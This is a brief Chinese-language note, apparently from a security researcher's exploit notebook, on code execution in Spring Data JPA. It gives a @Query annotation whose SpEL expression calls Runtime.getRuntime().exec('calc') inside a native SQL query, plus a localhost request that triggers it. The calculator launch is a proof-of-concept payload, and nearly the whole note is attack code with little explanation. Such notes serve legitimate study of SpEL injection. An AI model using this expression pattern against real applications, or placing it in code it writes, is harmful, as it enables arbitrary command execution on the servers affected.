# Spring data jpa

需要先配置application下的jdbc中url

```
spring.datasource.url
```

## 本地RCE

```
@Query(value="select * from user where id = ?#{T(Runtime).getRuntime().exec('calc')}", nativeQuery=true)
```

发起请求

```
http://127.0.0.1:8080/get/1
```

